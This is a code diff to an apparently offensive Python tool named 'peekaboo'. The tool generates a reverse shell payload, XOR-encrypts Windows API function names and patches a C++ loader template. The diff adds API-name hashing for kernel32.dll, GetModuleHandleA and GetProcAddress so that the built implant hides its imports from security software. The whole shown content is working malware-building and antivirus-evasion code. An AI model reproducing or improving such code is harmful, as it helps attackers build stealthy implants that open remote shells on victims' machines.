@@ -50,15 +50,13 @@ class PeekabooEncryptor():
         length = random.randint(16, 32)
         return ''.join(random.choice(string.ascii_letters) for i in range(length))
 
-class PeekabooHash():
-    def __init__(self):
-        self.hash = 0x35
-
+class PeekabooHasher():
     def hashing(self, data):
+        hash = 0x35
         for i in range(0, len(data)):
-            self.hash += ord(data[i]) + (self.hash << 1)
-        print (self.hash)
-        return self.hash
+            hash += ord(data[i]) + (hash << 1)
+        # print (hash)
+        return hash
 
 def generate_payload(host, port):
     print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
@@ -90,8 +88,10 @@ def run_peekaboo(host, port):
     print (Colors.BLUE + banner + Colors.ENDC)
     generate_payload(host, port)
     encryptor = PeekabooEncryptor()
+    hasher = PeekabooHasher()
     print (Colors.BLUE + "read payload..." + Colors.ENDC)
     plaintext = open("/tmp/hack.bin", "rb").read()
+    # plaintext = open("./meow.bin", "rb").read()
 
     f_va = "VirtualAlloc"
     f_vp = "VirtualProtect"
@@ -109,6 +109,10 @@ def run_peekaboo(host, port):
     ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
     ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
     ciphertext_rmm, rmm_key = encryptor.xor_encrypt(f_rmm, encryptor.func_key())
+
+    kernel32_hash = hasher.hashing("kernel32.dll")
+    getmodulehandle_hash = hasher.hashing("GetModuleHandleA")
+    getprocaddress_hash = hasher.hashing("GetProcAddress")
 
     tmp = open("peekaboo.cpp", "rt")
     data = tmp.read()
@@ -130,6 +134,11 @@ def run_peekaboo(host, port):
 
     data = data.replace('RunRCE', f_rce)
     data = data.replace('XOR', f_xor)
+
+    print (Colors.BLUE + "calculating win API hashes..." + Colors.ENDC)
+    data = data.replace('#define KERNEL32_HASH 0x00000000', '#define KERNEL32_HASH ' + str(kernel32_hash))
+    data = data.replace('#define GETMODULEHANDLE_HASH 0x00000000', '#define GETMODULEHANDLE_HASH ' + str(getmodulehandle_hash))
+    data = data.replace('#define GETPROCADDRESS_HASH 0x00000000', '#define GETPROCADDRESS_HASH ' + str(getprocaddress_hash))
 
     tmp.close()
     tmp = open("peekaboo-enc.cpp", "w+")
